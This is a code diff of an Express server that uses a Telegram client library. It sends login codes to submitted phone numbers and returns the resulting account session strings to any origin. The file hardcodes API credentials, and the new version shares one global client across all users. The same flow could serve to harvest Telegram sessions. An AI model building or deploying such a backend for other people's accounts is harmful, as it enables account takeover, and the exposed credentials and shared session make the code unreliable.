@@ -1,46 +1,45 @@
 const express = require('express');
-const cors = require('cors');
 const { TelegramClient } = require('telegram');
 const { StringSession } = require('telegram/sessions');
-const app = express();
+const cors = require('cors');
 
+const app = express();
 app.use(cors());
 app.use(express.json());
 
 const apiId = 23049703;
 const apiHash = 'e9c00af578a9de0253ef02337460498f';
-const sessions = new Map(); // Speichert { phone: { client, phoneCodeHash } }
+const stringSession = new StringSession(''); 
 
-app.post('/send-otp', async (req, res) => {
+let client = new TelegramClient(stringSession, apiId, apiHash, { connectionRetries: 5 });
+let phoneCodeHash = '';
+
+app.post('/send-code', async (req, res) => {
     const { phone } = req.body;
     try {
-        const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
         await client.connect();
-        const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, phone);
-        sessions.set(phone, { client, phoneCodeHash });
+        const result = await client.sendCode({ apiId, apiHash }, phone);
+        phoneCodeHash = result.phoneCodeHash;
         res.json({ success: true, phoneCodeHash });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-app.post('/verify-otp', async (req, res) => {
-    const { phone, code, phoneCodeHash } = req.body;
-    const sessionData = sessions.get(phone);
-    if (!sessionData) return res.status(400).json({ error: 'Session abgelaufen' });
-
-    try {
-        await sessionData.client.signIn({
-            apiId, apiHash,
-            phoneNumber: phone,
-            phoneCode: code,
-            phoneCodeHash: phoneCodeHash
-        });
-        const sessionString = sessionData.client.session.save();
-        res.json({ success: true, session: sessionString });
     } catch (err) {
         res.status(400).json({ error: err.message });
     }
 });
 
-app.listen(process.env.PORT || 3000);
+app.post('/verify-code', async (req, res) => {
+    const { phone, code, phoneCodeHash } = req.body;
+    try {
+        const result = await client.signIn({
+            apiId,
+            apiHash,
+            phoneNumber: phone,
+            phoneCodeHash: phoneCodeHash,
+            phoneCode: code
+        });
+        res.json({ success: true, session: client.session.save() });
+    } catch (err) {
+        res.status(400).json({ error: err.message });
+    }
+});
+
+app.listen(3000, () => console.log('Server läuft auf Port 3000'));
